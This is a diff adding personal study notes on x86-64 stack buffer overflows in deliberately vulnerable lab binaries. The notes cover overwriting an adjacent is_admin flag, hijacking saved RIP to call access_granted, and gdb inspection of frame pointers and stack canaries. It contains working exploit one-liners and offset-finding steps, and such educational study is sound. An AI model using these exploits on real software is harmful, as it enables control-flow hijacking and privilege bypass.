@@ -1,0 +1,310 @@
+stack frame.
+- Prologue: Function starts → prepares the stack frame.
+- Epilogue: Function ends → restores the stack and returns to the caller.
+
+Prologue — Function entry
+Example assembly:
+push rbp
+mov  rbp, rsp
+sub  rsp, 0x20
+
+Epilogue — Function exit
+Example assembly:
+leave
+ret
+
+
+==============================================
+Character-array overflow/oversized input
+==============================================
+
+gcc -g -O0 -fno-stack-protector -no-pie -z execstack -o vuln stack.c
+
+
+Structure layout 
+
+struct Frame
+{
+    char buffer[16];
+    int is_admin;
+};
+
+Memory on the stack looks roughly like:
+
+
++----------------+
+| buffer[16]     | 16 bytes
++----------------+
+| is_admin       | 4 bytes
++----------------+
+
+
+Vulnerable code
+read(0, f.buffer, 32);
+read() is told to read up to 32 bytes into a buffer that can only hold 16 bytes.
+
+
+Buffer size = 16 bytes 
+Read size = 32 bytes
+This allows input to continue beyond buffer and overwrite nearby memory.
+
+
+If you run:
+./vuln
+
+and type:
+a
+
+Memory becomes:
+buffer: 61 0a ... 
+is_admin: 00 00 00 00
+
+
+Because is_admin remains zero:
+if (f.is_admin == 1)
+
+is false, so:
+Normal user
+
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x01\x00\x00\x00")' | ./vuln
+
+b"A"*16
+
+fills the entire buffer:
+AAAAAAAAAAAAAAAA
+
+Memory:
+buffer: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+
+
+Second part:
+
+b"\x01\x00\x00\x00"
+
+writes four more bytes.
+These bytes land on:
+is_admin
+
+
+Memory becomes:
+
+buffer: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+ is_admin: 01 00 00 00
+
+Why 01 00 00 00 equals 1
+
+Most Linux systems on x86/x86-64 are little-endian.
+The integer bytes:01 00 00 00
+
+are interpreted as:0x00000001
+
+which is decimal:1
+
+Therefore:
+f.is_admin == 1 becomes true.
+
+
+------------------------------------------------------------
+
+====================================
+
+
+=======================================
+Character-array overflow/stack2 gets()
+=======================================
+
+
+username is only 24 bytes, but:
+read(0, username, 200);
+
+So if you enter more than 24 bytes, the extra data keeps writing past the buffer and starts overwriting other data on the stack.
+
+
+A simplified stack frame for login() looks like:
+Higher Addresses
++----------------+
+| Saved RIP      | <- return address
++----------------+
+| Saved RBP      |
++----------------+
+| username[24]   |
++----------------+
+Lower Addresses
+
+
+When login() finishes, the CPU executes:
+
+Assembly
+ret
+
+and jumps to the address stored in Saved RIP.
+
+If we overwrite Saved RIP, we control where execution goes.
+
+Finding access_granted
+nm ./login | grep access_granted
+
+ex:
+0000000000401156 T access_granted
+
+
+Meaning:
+
+access_granted() = 0x401156
+
+
+Finding the Offset:
+You need to know:
+
+Plain Text
+How many bytes until Saved RIP?
+
+Instead of guessing, pwntools creates a unique pattern:
+python3 -c 'from pwn import *; print(cyclic(100).decode())'
+
+first we need to crash 
+python3 -c 'from pwn import *; print(cyclic(100).decode())'
+
+copy then open gdb paste that 
+gdb -q ./login
+run
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+
+it will crash 
+then 
+info registers rip rbp
+python3 -c 'from pwn import *; print(cyclic_find(0xYOUR_VALUE, n=8))'
+
+map way to concept
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                                        ↓
+                                  saved RIP
+                                        ↓
+                                  0x401146
+                                        ↓
+                              access_granted()
+                              
+                              
+python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q", 0x401146))' | ./login
+                              
+                                
+=======================================
+Character-array overflow/stack char
+=======================================
+
+char buffer[16];
+read(0, buffer, 100);
+
+Because buffer is only 16 bytes and read() accepts up to 100 bytes, data can overwrite adjacent stack memory.
+
+A typical stack frame might look something like:
+Higher addresses +------------------+ 
+| Return Address | 
++------------------+
+ | Saved RBP | 
++------------------+ 
+| buffer[16] | 
++------------------+ 
+Lower addresses
+
+When read() writes more than 16 bytes:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA... ^^^^^^^^^^^^^^^^ fills buffer additional bytes continue beyond buffer
+
+Before entering vuln, the previous frame pointer is stored.
+buffer --> 16 bytes 
+saved RBP --> 8 bytes
+
+On a 64-bit system:
+RBP = 8 bytes
+RIP = 8 bytes
+
+
+======================================
+Character-array overflow/stack scanf
+======================================
+Vulnerability
+scanf("%s", buffer);
+%s reads until whitespace and does not know the size of buffer.
+
+If you enter more than 15 characters plus the null terminator:
+
+Shell
+python3 -c 'print("A"*100)' | ./vuln
+
+scanf writes beyond buffer[16] and corrupts adjacent stack data.
+======================================
+
+======================================
+frame-pointer corruption
+======================================
+disassemble collect_note
+break *collect_note+0x42
+
+run < payload.bin
+
+inspect stack
+x/5gx $rbp-0x20
+
+Inspect the saved RBP:
+x/gx $rbp
+
+Inspect the return address:
+x/gx $rbp+8
+
+Inspect the registers:
+info registers rbp rsp rip
+
+Step through the epilogue:
+ni
+info registers rbp rsp
+======================================
+
+===========================
+stack canary
+===========================
+gdb -q ./canary
+
+set disassembly-flavor intel
+set pagination off
+
+break vuln
+break __stack_chk_fail
+
+run < <(python3 -c 'print("A"*100)')
+
+Inspect the vulnerable function
+disassemble /r vuln
+context
+info registers rsp rbp rip
+
+Inspect the canary in memory
+info registers rbp rsp
+x/gx $rbp-0x8
+x/12gx $rbp-0x40
+telescope $rbp-0x40
+
+x/gx $rbp-0x8
+
+watch *(unsigned long long *)($rbp-0x8)
+
+continue
+
+x/gx $rbp-0x8
+telescope $rbp-0x40
+context
+
+
+Catch __stack_chk_fail()
+
+continue
+
+Inspect:
+bt
+info registers rip rsp rbp
+frame 1
+x/gx $rbp-0x8
+
+===========================
